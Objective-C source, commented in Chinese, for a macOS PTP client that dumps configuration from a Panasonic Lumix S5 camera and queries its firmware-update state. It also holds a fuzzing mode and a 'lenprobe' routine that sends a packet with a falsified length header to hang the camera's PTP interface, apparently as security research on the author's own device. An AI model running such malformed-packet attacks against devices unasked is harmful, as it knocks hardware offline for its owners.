// S5 / LUMIX S 只读 PTP 客户端（macOS 原生 ImageCaptureCore 路径）
// =============================================================
// 基于已验证可用的 S1M2 baseline 客户端改写（该路径已实测 dump 出 9.2 MiB 的 0x9421）。
//
// 只读，安全。只发送：
//   0x1001 GetDeviceInfo
//   (requestOpenSession)
//   0x1004 GetStorageIDs
//   0x9104  GetSyncList
//   0x9421  LmxExt_Get_SetupFilesConfigSet_Info  (全量配置 dump, tag=0x080000a2)
//   0x9605  LmxExt_Get_Event_Info               (FW 升级状态机只读查询, mode=fwup)
//   (requestCloseSession)
//
// 绝不发送 0x9406(任意子码)/0x9422/0x9423/0x940d/格式化/升级/关机/快门。
//   说明：0x9406 的 8 个已知子码（0x11~0x18）经 Tether 反汇编全部为"动作/状态切换"，
//         没有只读查询子码，因此本工具绝不发 0x9406。FW 升级状态机的只读查询
//         走 0x9605 Get_Event_Info（纯 Get，不改状态）。
//
// 编译（macOS）：
//   clang -framework Foundation -framework ImageCaptureCore -o s5_ptp_dump s5_ptp_dump.m
// 运行（相机 Tether 模式 + USB 连上后）：
//   ./s5_ptp_dump <输出目录> [型号子串] [mode]
//     mode=dump  (默认)  0x9421 全量配置 dump
//     mode=fwup          0x9605 FW 升级状态机只读查询
//     mode=fuzz          CVE 类只读探测（参数数量/取值、TID 边界、未知操作码发现）
//     mode=lenprobe     受控 length-DoS 演示（对应 "无 length 校验" CVE 类，最后运行）
//   例：
//     ./s5_ptp_dump ./ptp_out S5 dump
//     ./s5_ptp_dump ./ptp_out S5 fwup
//     ./s5_ptp_dump ./ptp_out_fuzz S5 fuzz
//     ./s5_ptp_dump ./ptp_out_fuzz S5 lenprobe
//
// 为什么走 ImageCaptureCore 而不是 libusb：
//   macOS 上 PTP 设备常被系统相机栈占用，libusb 抢接口易失败。ImageCaptureCore
//   是 Apple 原生框架，自动处理驱动占用，且 S1M2 项目已用同一路径成功 dump 0x9421。

#import <Foundation/Foundation.h>
#import <ImageCaptureCore/ImageCaptureCore.h>

@interface Capture : NSObject <ICDeviceBrowserDelegate, ICCameraDeviceDelegate>
@property (nonatomic, strong) ICDeviceBrowser *browser;
@property (nonatomic, strong) ICCameraDevice *camera;
@property (nonatomic, strong) NSString *outDir;
@property (nonatomic, copy, nullable) NSString *modelFilter;   // nil = 任意相机
@property (nonatomic, copy) NSString *mode;                    // "dump" | "fwup"
@property (nonatomic, assign) uint32_t tid;
@property (nonatomic, assign) BOOL done;
@property (nonatomic, assign) BOOL failed;
@property (nonatomic, assign) BOOL closing;
@property (nonatomic, strong) NSMutableArray<NSMutableDictionary *> *log;
@end

@implementation Capture

- (void)logEvent:(NSDictionary *)ev {
    NSMutableDictionary *row = [ev mutableCopy];
    row[@"time_utc"] = [[NSISO8601DateFormatter new] stringFromDate:[NSDate date]];
    [self.log addObject:row];
    NSData *json = [NSJSONSerialization dataWithJSONObject:self.log options:NSJSONWritingPrettyPrinted error:nil];
    [json writeToFile:[self.outDir stringByAppendingPathComponent:@"capture_log.json"] atomically:YES];
}

- (uint32_t)u32at:(NSData *)d idx:(NSUInteger)i {
    const uint8_t *b = d.bytes;
    return b[i] | (b[i+1]<<8) | (b[i+2]<<16) | ((uint32_t)b[i+3]<<24);
}
- (uint16_t)u16at:(NSData *)d idx:(NSUInteger)i {
    const uint8_t *b = d.bytes;
    return (uint16_t)(b[i] | (b[i+1]<<8));
}

- (void)close {
    if (self.closing) return;
    self.closing = YES;
    [self.camera requestCloseSession];
}

// 构造并发送一个精确长度的 PTP 命令容器
- (void)sendPacket:(uint16_t)op params:(NSArray<NSNumber *> *)params tid:(uint32_t)t name:(NSString *)name next:(void (^)(BOOL))next {
    NSUInteger np = params.count;
    uint32_t len = 12 + (uint32_t)(4 * np);
    NSMutableData *packet = [NSMutableData dataWithLength:len];
    uint8_t *p = packet.mutableBytes;
    p[0] = len & 0xff; p[1] = (len>>8) & 0xff; p[2] = (len>>16) & 0xff; p[3] = (len>>24) & 0xff;
    p[4] = 1; p[5] = 0;                       // type = 0x0001 (command)
    p[6] = op & 0xff; p[7] = (op>>8) & 0xff;  // opcode
    p[8] = t & 0xff; p[9] = (t>>8) & 0xff; p[10] = (t>>16) & 0xff; p[11] = (t>>24) & 0xff;
    for (NSUInteger i = 0; i < np; i++) {
        uint32_t v = [params[i] unsignedIntValue];
        p[12+i*4] = v & 0xff; p[13+i*4] = (v>>8) & 0xff;
        p[14+i*4] = (v>>16) & 0xff; p[15+i*4] = (v>>24) & 0xff;
    }

    [self.camera requestSendPTPCommand:packet outData:nil completion:^(NSData *data, NSData *response, NSError *error) {
        uint32_t rlen = 0; uint16_t rtype = 0, rcode = 0;
        if (response.length >= 12) {
            rlen  = [self u32at:response idx:0];
            rtype = [self u16at:response idx:4];
            rcode = [self u16at:response idx:6];
        }
        BOOL transportOK = !error && response.length >= 12 && rlen == response.length && rtype == 3;
        BOOL ok = transportOK && rcode == 0x2001;
        [self logEvent:@{
            @"event": @"read_response",
            @"name": name,
            @"opcode": [NSString stringWithFormat:@"0x%04x", op],
            @"response_code": [NSString stringWithFormat:@"0x%04x", rcode],
            @"data_bytes": @(data.length),
            @"response_bytes": @(response.length),
            @"transport_ok": @(transportOK),
            @"ok": @(ok),
            @"error": error ? error.localizedDescription : @"",
        }];
        if (data.length > 0) {
            [data writeToFile:[self.outDir stringByAppendingPathComponent:[name stringByAppendingString:@".bin"]] atomically:YES];
        }
        if (response.length > 0) {
            [response writeToFile:[self.outDir stringByAppendingPathComponent:[name stringByAppendingString:@".resp.bin"]] atomically:YES];
        }
        if (next) next(ok);
    }];
}

// 自动递增 TID 的便捷封装（保持原有只读序列行为）
- (void)sendCmd:(uint16_t)op params:(NSArray<NSNumber *> *)params name:(NSString *)name next:(void (^)(BOOL))next {
    [self sendPacket:op params:params tid:(++self.tid) name:name next:next];
}

// 只读序列：GetDeviceInfo -> GetStorageIDs -> 0x9104 -> 0x9421 -> close
- (void)runReadOnlySequence {
    [self sendCmd:0x1001 params:@[] name:@"device_info" next:^(BOOL ok){
        if (!ok) { self.failed = YES; [self close]; return; }
        [self sendCmd:0x1004 params:@[] name:@"storage_ids" next:^(BOOL ok){
            // GetStorageIDs 失败不致命，继续
            [self sendCmd:0x9104 params:@[] name:@"sync_list" next:^(BOOL ok){
                if (!ok) { /* 0x9104 可选，失败继续 */ }
                // 核心：0x9421 全量配置 dump
                [self sendCmd:0x9421 params:@[@0x080000a2] name:@"config_0x9421" next:^(BOOL ok){
                    if (ok) {
                        printf("[OK] 0x9421 dump 完成，输出目录：%s\n",
                               [self.outDir UTF8String]);
                    } else {
                        // 备用：试 name tag
                        [self sendCmd:0x9421 params:@[@0x080000a1] name:@"config_0x9421_altname" next:^(BOOL ok2){
                            if (!ok2) { self.failed = YES; }
                            [self close];
                        }];
                        return;
                    }
                    [self close];
                }];
            }];
        }];
    }];
}

// FW 升级状态机只读查询：0x9605 Get_Event_Info
// 每个事件类型一次纯 Get 查询，绝不触发任何动作。
// 字段语义已对照 Tether 2.12 反汇编（Lmx_func_api_fwup_Get_Event_Info）核实：
//   0x41000013 -> Ready:      提取 Address(u64)，日志 "RedyInfo:Address : 0x%016llx"
//   0x41000014 -> 完成态(=0x13+1): 读完成 Status
//   0x41000015 -> CmpInfo(=0x13+2): 提取 Status(u32)，日志 "CmpInfo :Status : 0x%08x"
// 其余（0x41000012/16/17）为相邻事件类型探测（映射事件空间）。
// 相机空闲时多数返回 InvalidParam/GeneralError，属正常。
// 地址由机身返回（Tether 存于 0x260498/0x2604ac 后原样填入 0x9606），主机不可自填 → 无任意地址写。
- (void)runFWUPSequence {
    NSArray<NSNumber *> *evts = @[@0x41000012, @0x41000013, @0x41000014,
                                  @0x41000015, @0x41000016, @0x41000017];
    printf("[*] 开始 0x9605 FW 升级状态机只读查询（%lu 个事件类型）...\n",
           (unsigned long)evts.count);
    fflush(stdout);
    [self fwupQueryEvts:evts index:0];
}

// 用递归对象方法驱动查询链，避免自引用 block（在 XPC 回复线程回调时更稳）。
- (void)fwupQueryEvts:(NSArray<NSNumber *> *)evts index:(NSUInteger)idx {
    if (idx >= evts.count) { [self close]; return; }
    NSNumber *ev = evts[idx];
    NSString *name = [NSString stringWithFormat:@"fwup_ev_0x%08x", ev.unsignedIntValue];
    [self sendCmd:0x9605 params:@[ev] name:name next:^(BOOL ok){
        printf("    [%s] 0x9605 evt=0x%08x\n", ok ? "OK" : "ERR", ev.unsignedIntValue);
        fflush(stdout);
        [self fwupQueryEvts:evts index:idx + 1];
    }];
}

#pragma mark - FUZZ / LENPROBE（CVE 类只读探测）

// FUZZ：构造一组"安全只读"探测，逐个发送并记录 opcode->返回码。
// 安全性由构造保证：
//   1) 只含已知只读操作码（0x1001/1002/1004/9104/9421/9605）+ 一小撮
//      "未知/邻接"操作码发现集，且**显式排除**所有已知写/动作操作码
//      （0x9406/940d/9414/9422/9423/9606/9607/0x1007 快门/0x1008 复位/0x40xx）。
//   2) 每个包 length 精确（length 不符 = 挂死，绝不发送错误 length）。
//   3) 参数数量/取值/TID 变化均属"参数错误"类，设备回干净的 0x201d/0x2002（已验证安全）。
// 目的：对照 libgphoto2/libmtp 的 PTP 解析 CVE 类（无 length 校验 / 按类型推进
// 越界 / 参数未校验 / 事务号状态混淆），摸清相机 PTP 解析器对异常输入的处理。
- (void)runFuzzSequence {
    // 每条探测 = @[opcode(u16), params(NSArray<NSNumber*>), tidOverride(NSNumber|nil)]
    NSMutableArray *probes = [NSMutableArray array];

    // Phase 1：基线只读（0 参）
    [probes addObject:@[@(0x1001), @[], [NSNull null]]];
    [probes addObject:@[@(0x1002), @[], [NSNull null]]];
    [probes addObject:@[@(0x1004), @[], [NSNull null]]];
    [probes addObject:@[@(0x9104), @[], [NSNull null]]];

    // Phase 2：核心只读（已知正确参数）
    [probes addObject:@[@(0x9421), @[@(0x080000a2)], [NSNull null]]];
    [probes addObject:@[@(0x9605), @[@(0x41000013)], [NSNull null]]];

    // Phase 3：参数数量 / 取值 fuzz（只读操作码）
    [probes addObject:@[@(0x1001), @[@(0)], [NSNull null]]];
    [probes addObject:@[@(0x1001), @[@(0),@(0)], [NSNull null]]];
    [probes addObject:@[@(0x1001), @[@(0),@(0),@(0)], [NSNull null]]];
    [probes addObject:@[@(0x9421), @[], [NSNull null]]];                       // 0 参（应报错）
    [probes addObject:@[@(0x9421), @[@(0x080000a1)], [NSNull null]]];          // 备用 tag
    [probes addObject:@[@(0x9421), @[@(0)], [NSNull null]]];                   // 零 tag
    [probes addObject:@[@(0x9421), @[@(0x080000ff)], [NSNull null]]];          // 高位 tag
    [probes addObject:@[@(0x9421), @[@(0x080000a2),@(0)], [NSNull null]]];     // 2 参
    [probes addObject:@[@(0x9421), @[@(0x080000a2),@(0),@(0)], [NSNull null]]];// 3 参
    [probes addObject:@[@(0x9605), @[], [NSNull null]]];
    [probes addObject:@[@(0x9605), @[@(0)], [NSNull null]]];
    [probes addObject:@[@(0x9605), @[@(0x41000000)], [NSNull null]]];
    [probes addObject:@[@(0x9605), @[@(0x41000013),@(0)], [NSNull null]]];
    [probes addObject:@[@(0x9605), @[@(0x41000013),@(0),@(0)], [NSNull null]]];
    [probes addObject:@[@(0x1004), @[@(0)], [NSNull null]]];
    [probes addObject:@[@(0x1004), @[@(0),@(0)], [NSNull null]]];

    // Phase 4：TID 边界（0x1001 上）
    [probes addObject:@[@(0x1001), @[], @(0x00000000)]];   // TID=0
    [probes addObject:@[@(0x1001), @[], @(0xFFFFFFFF)]];   // TID=max
    [probes addObject:@[@(0x1001), @[], @(0x00000001)]];   // TID 复用

    // Phase 5：未知/邻接操作码发现（无参），排除全部已知写/动作
    NSArray *unk = @[@(0x1005),
                     @(0x9001),@(0x9002),
                     @(0x9101),@(0x9102),@(0x9103),@(0x9105),@(0x9106),@(0x9107),
                     @(0x9601),@(0x9602),@(0x9603),@(0x9604),
                     @(0x9608),@(0x9609),@(0x960a),
                     @(0x9501),@(0x9701)];
    for (NSNumber *op in unk) { [probes addObject:@[op, @[], [NSNull null]]]; }

    printf("[*] FUZZ：%lu 个安全只读探测（exact-length；不含任何写/动作操作码）...\n",
           (unsigned long)probes.count);
    fflush(stdout);
    [self runProbes:probes index:0];
}

- (void)runProbes:(NSArray *)probes index:(NSUInteger)idx {
    if (idx >= probes.count) { [self close]; return; }
    NSArray *pr = probes[idx];
    uint16_t op   = (uint16_t)[pr[0] unsignedIntValue];
    NSArray  *par = (NSArray *)pr[1];
    BOOL hasOv = (pr[2] != [NSNull null]);
    uint32_t t = hasOv ? (uint32_t)[pr[2] unsignedIntValue] : (++self.tid);
    NSString *name = [NSString stringWithFormat:@"fuzz_0x%04x_p%lu_t%08x", op,
                      (unsigned long)par.count, t];
    [self sendPacket:op params:par tid:t name:name next:^(BOOL ok){
        printf("    [%s] 0x%04x p=%lu t=0x%08x\n", ok ? "OK " : "ERR", op,
               (unsigned long)par.count, t);
        fflush(stdout);
        [self runProbes:probes index:idx + 1];
    }];
}

// LENPROBE：受控 DoS 演示（对应 CVE 类 "无 length 校验"，如 libgphoto2 CVE-2026-40333）。
// 发送 12 字节，但头里声明 length=0x400。相机等待缺失的 0x3F4 字节（无超时）→
// PTP 接口挂死，需拔插 USB 恢复。可恢复、不砖机。**放在最后**，仅在安全 fuzz 之后运行。
- (void)runLenProbe {
    uint32_t claimed = 0x400;
    NSMutableData *packet = [NSMutableData dataWithLength:12];
    uint8_t *p = packet.mutableBytes;
    p[0] = claimed & 0xff; p[1] = (claimed>>8)&0xff; p[2] = (claimed>>16)&0xff; p[3] = (claimed>>24)&0xff;
    p[4] = 1; p[5] = 0;
    p[6] = 0x21; p[7] = 0x94;                       // 0x9421（只读语义，仅作载体）
    uint32_t t = ++self.tid;
    p[8] = t & 0xff; p[9] = (t>>8)&0xff; p[10] = (t>>16)&0xff; p[11] = (t>>24)&0xff;
    printf("[!] LENPROBE：声明 length=0x%04x 但实发 12 字节 → 预期相机 PTP 挂死（本地 DoS，拔插可恢复）\n", claimed);
    fflush(stdout);
    [self logEvent:@{@"event": @"lenprobe_sent", @"claimed_length": @(claimed), @"actual_bytes": @(12)}];
    [self.camera requestSendPTPCommand:packet outData:nil completion:^(NSData *data, NSData *response, NSError *error) {
        [self logEvent:@{@"event": @"lenprobe_result",
                         @"error": error ? error.localizedDescription : @"",
                         @"resp_bytes": @(response.length)}];
        printf("[*] LENPROBE 完成（若仍在线说明主机侧/解析器做了 length 校验）。\n");
        [self close];
    }];
}

#pragma mark - ICDeviceBrowserDelegate

- (void)deviceBrowser:(ICDeviceBrowser *)browser didAddDevice:(ICDevice *)device moreComing:(BOOL)moreComing {
    if (self.camera || !device) return;
    if (![device isKindOfClass:[ICCameraDevice class]]) return;
    NSString *nm = device.name ?: @"";
    if (self.modelFilter && ![nm containsString:self.modelFilter]) return;
    self.camera = (ICCameraDevice *)device;
    self.camera.delegate = self;
    [self logEvent:@{@"event": @"device_found", @"model": nm}];
    printf("[*] 发现相机：%s，打开会话...\n", [nm UTF8String]);
    [self.camera requestOpenSession];
}

- (void)deviceBrowser:(ICDeviceBrowser *)browser didRemoveDevice:(ICDevice *)device moreGoing:(BOOL)moreGoing {}

#pragma mark - ICCameraDeviceDelegate

- (void)cameraDevice:(ICCameraDevice *)camera didAddItems:(NSArray *)items {}
- (void)cameraDevice:(ICCameraDevice *)camera didRemoveItems:(NSArray *)items {}
- (void)cameraDevice:(ICCameraDevice *)camera didRenameItems:(NSArray *)items {}
- (void)cameraDevice:(ICCameraDevice *)camera didReceiveThumbnail:(CGImageRef)thumbnail forItem:(ICCameraItem *)item error:(NSError *)error {}
- (void)cameraDevice:(ICCameraDevice *)camera didReceiveMetadata:(NSDictionary *)metadata forItem:(ICCameraItem *)item error:(NSError *)error {}
- (void)cameraDevice:(ICCameraDevice *)camera didReceivePTPEvent:(NSData *)eventData {}
- (void)cameraDeviceDidChangeCapability:(ICCameraDevice *)camera {}
- (void)deviceDidBecomeReadyWithCompleteContentCatalog:(ICCameraDevice *)device {}
- (void)cameraDeviceDidRemoveAccessRestriction:(ICDevice *)device {}
- (void)cameraDeviceDidEnableAccessRestriction:(ICDevice *)device {}

- (void)didRemoveDevice:(ICDevice *)device {
    if (self.closing || self.done) return;
    self.failed = YES; self.done = YES;
    [self logEvent:@{@"event": @"device_removed"}];
}

- (void)device:(ICDevice *)device didOpenSessionWithError:(NSError *)error {
    if (error) {
        self.failed = YES; self.done = YES;
        [self logEvent:@{@"event": @"open_failed", @"error": error.localizedDescription}];
        printf("[!] 打开会话失败：%s\n", [error.localizedDescription UTF8String]);
        return;
    }
    [self logEvent:@{@"event": @"session_opened"}];
    printf("[*] 会话已建立，开始只读取序列...\n");
    if ([self.mode isEqualToString:@"fwup"]) {
        [self runFWUPSequence];
    } else if ([self.mode isEqualToString:@"fuzz"]) {
        [self runFuzzSequence];
    } else if ([self.mode isEqualToString:@"lenprobe"]) {
        [self runLenProbe];
    } else {
        [self runReadOnlySequence];
    }
}

- (void)device:(ICDevice *)device didCloseSessionWithError:(NSError *)error {
    [self logEvent:@{@"event": @"session_closed",
                     @"error": error ? error.localizedDescription : @""}];
    self.done = YES;
}

@end

int main(int argc, const char **argv) {
    @autoreleasepool {
        if (argc < 2) {
            fprintf(stderr, "用法：\n  ./s5_ptp_dump <输出目录> [型号子串] [mode]\n"
                            "  mode: dump(默认) | fwup | fuzz | lenprobe\n"
                            "    dump     0x9421 全量配置只读 dump\n"
                            "    fwup     0x9605 FW 升级状态机只读查询\n"
                            "    fuzz     CVE 类只读探测（参数/TID/未知操作码，安全）\n"
                            "    lenprobe 受控 length-DoS 演示（最后运行，挂死需拔插恢复）\n");
            return 2;
        }
        Capture *c = [Capture new];
        c.outDir = [NSString stringWithUTF8String: argv[1]];
        if (argc >= 3) c.modelFilter = [NSString stringWithUTF8String: argv[2]];
        c.mode = (argc >= 4) ? [NSString stringWithUTF8String: argv[3]] : @"dump";
        c.log = [NSMutableArray array];
        c.browser = [ICDeviceBrowser new];
        c.browser.delegate = c;
        c.browser.browsedDeviceTypeMask = ICDeviceTypeMaskCamera | ICDeviceLocationTypeMaskLocal;
        [c logEvent:@{@"event": @"started", @"purpose": @"readonly_0x9421_dump",
                      @"model_filter": c.modelFilter ?: @"(any)",
                      @"mode": c.mode}];

        NSError *err = nil;
        if (![[NSFileManager defaultManager] createDirectoryAtPath:c.outDir
                          withIntermediateDirectories:YES attributes:nil error:&err]) {
            fprintf(stderr, "无法创建输出目录：%s\n", err.localizedDescription.UTF8String);
            return 2;
        }

        [c.browser start];
        NSDate *deadline = [NSDate dateWithTimeIntervalSinceNow:180];
        while (!c.done && deadline.timeIntervalSinceNow > 0) {
            [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.1]];
        }
        if (!c.done) {
            c.failed = YES;
            [c logEvent:@{@"event": @"timeout"}];
            [c close];
            NSDate *cd = [NSDate dateWithTimeIntervalSinceNow:5];
            while (!c.done && cd.timeIntervalSinceNow > 0) {
                [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.1]];
            }
        }
        [c.browser stop];
        printf("只读 dump %s；日志已保存到 %s/capture_log.json\n",
               c.failed ? "失败" : "完成", [c.outDir UTF8String]);
        return c.failed ? 1 : 0;
    }
}
